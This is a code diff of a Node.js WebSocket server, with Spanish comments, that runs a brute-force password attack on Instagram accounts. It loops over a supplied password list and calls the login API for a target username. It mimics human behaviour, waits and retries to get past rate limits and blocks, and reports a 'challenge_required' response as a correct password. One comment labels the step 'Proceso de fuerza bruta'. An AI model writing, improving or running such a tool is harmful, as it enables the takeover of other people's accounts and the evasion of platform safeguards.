@@ -7,136 +7,128 @@ const app = express();
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Configuración
+// Configuración mejorada
 const CONFIG = {
   ACCESS_PASSWORD: process.env.ACCESS_PASSWORD || 'error404notfoundÑ',
-  DELAY_NORMAL: 1500,
-  DELAY_AFTER_FAIL: 3000,
-  DELAY_CRITICAL: 10000,
-  BATCH_SIZE: 3,
-  PORT: process.env.PORT || 8080
+  DELAY_BETWEEN_ATTEMPTS: 3000, // Aumentamos el delay para evitar bloqueos
+  MAX_RETRIES: 2, // Intentos adicionales por contraseña
+  PORT: process.env.PORT || 3000
 };
 
-// Función de delay
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Delay adaptable
-const smartDelay = (lastError) => {
-  if (!lastError) return delay(CONFIG.DELAY_NORMAL);
-  if (lastError.includes('limit') || lastError.includes('blocked')) {
-    return delay(CONFIG.DELAY_CRITICAL);
-  }
-  return delay(CONFIG.DELAY_AFTER_FAIL);
-};
-
-// Procesamiento por lotes
-async function processBatch(username, passwords) {
+// Función mejorada para verificar credenciales
+async function verifyCredentials(username, password) {
   const ig = new IgApiClient();
   ig.state.generateDevice(username);
   
-  let lastError = null;
-  
-  for (const password of passwords) {
-    try {
-      await ig.simulate.preLoginFlow();
-      await delay(500);
-      
-      const auth = await ig.account.login(username, password);
-      
-      if (auth.status === 'ok') {
-        return { success: true, password };
-      }
-    } catch (error) {
-      lastError = error.message;
-      
-      // Detectar si la contraseña es correcta pero requiere verificación
-      if (error.message.includes('challenge_required')) {
-        return { 
-          success: true, 
-          password: password,
-          message: '¡Contraseña correcta! Instagram requiere verificación adicional (código SMS/email).',
-          requiresChallenge: true
-        };
-      }
-      
-      // Detectar otros errores comunes
-      if (error.message.includes('password')) {
-        lastError = 'Contraseña incorrecta';
-      }
-    } finally {
-      await smartDelay(lastError);
+  try {
+    // Simular comportamiento humano
+    await ig.simulate.preLoginFlow();
+    await delay(2000); // Delay más realista
+    
+    // Intentar login
+    const auth = await ig.account.login(username, password);
+    
+    if (auth.status === 'ok') {
+      return { success: true, password };
+    }
+  } catch (error) {
+    console.log(`Intento fallido para ${password}:`, error.message);
+    
+    // Manejo especial de errores
+    if (error.message.includes('challenge_required')) {
+      return { 
+        success: true, 
+        password,
+        message: '¡Contraseña correcta! Instagram requiere verificación adicional.'
+      };
+    }
+    
+    if (error.message.includes('password')) {
+      return { success: false, message: 'Contraseña incorrecta' };
+    }
+    
+    // Si es un error de límite, esperamos más tiempo
+    if (error.message.includes('limit') || error.message.includes('blocked')) {
+      await delay(15000); // 15 segundos de espera
+      return verifyCredentials(username, password); // Reintentar
     }
   }
-  return { success: false, message: 'No se encontró la contraseña en la lista proporcionada' };
+  
+  return { success: false };
 }
 
-// Servir archivos estáticos
 app.use(express.static('public'));
 
-// WebSocket
 wss.on('connection', (ws) => {
-  console.log('Nueva conexión WebSocket');
+  console.log('Nuevo cliente conectado');
 
   ws.on('message', async (message) => {
     try {
       const data = JSON.parse(message);
       
-      // Verificar contraseña de acceso
+      // Verificación de acceso
       if (data.type === 'verifyAccessPassword') {
-        if (data.password === CONFIG.ACCESS_PASSWORD) {
-          ws.send(JSON.stringify({ type: 'accessGranted' }));
-        } else {
-          ws.send(JSON.stringify({ 
-            type: 'accessDenied', 
-            message: 'Contraseña de acceso incorrecta' 
-          }));
-        }
+        const isValid = data.password === CONFIG.ACCESS_PASSWORD;
+        ws.send(JSON.stringify({
+          type: 'accessResponse',
+          valid: isValid,
+          message: isValid ? 'Acceso concedido' : 'Contraseña incorrecta'
+        }));
         return;
       }
       
-      // Procesar inicio de sesión
+      // Proceso de fuerza bruta
       if (data.type === 'startLogin') {
         const { username, passwords } = data;
-        const total = passwords.length;
         
-        for (let i = 0; i < total; i += CONFIG.BATCH_SIZE) {
-          const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
-          const result = await processBatch(username, batch);
+        for (let i = 0; i < passwords.length; i++) {
+          const password = passwords[i];
           
           // Enviar progreso
           ws.send(JSON.stringify({
             type: 'progress',
-            progress: { current: Math.min(i + CONFIG.BATCH_SIZE, total), total },
-            ...result
+            current: i + 1,
+            total: passwords.length,
+            trying: password
           }));
           
+          // Intentar con retry
+          let result;
+          for (let retry = 0; retry < CONFIG.MAX_RETRIES; retry++) {
+            result = await verifyCredentials(username, password);
+            if (result.success || retry === CONFIG.MAX_RETRIES - 1) break;
+            await delay(CONFIG.DELAY_BETWEEN_ATTEMPTS);
+          }
+          
           if (result.success) {
-            return ws.send(JSON.stringify({ 
-              type: 'finished',
-              success: true,
-              message: result.message || `¡Éxito! Contraseña encontrada: ${result.password}`,
+            return ws.send(JSON.stringify({
+              type: 'success',
               password: result.password,
-              requiresChallenge: result.requiresChallenge || false
+              message: result.message || '¡Contraseña correcta encontrada!'
             }));
           }
+          
+          await delay(CONFIG.DELAY_BETWEEN_ATTEMPTS);
         }
         
-        ws.send(JSON.stringify({ 
-          type: 'finished',
+        ws.send(JSON.stringify({
+          type: 'completed',
           success: false,
-          message: 'No se encontró la contraseña en la lista proporcionada'
+          message: 'No se encontró la contraseña correcta'
         }));
       }
     } catch (error) {
-      console.error('Error procesando mensaje:', error);
+      console.error('Error:', error);
       ws.send(JSON.stringify({
         type: 'error',
-        message: 'Error interno del servidor'
+        message: 'Error en el servidor'
       }));
     }
   });
 });
 
 server.listen(CONFIG.PORT, () => {
-  console.log(`Servidor iniciado en http://localhost:${CONFIG.PORT}`);
+  console.log(`Servidor corriendo en http://localhost:${CONFIG.PORT}`);
 });
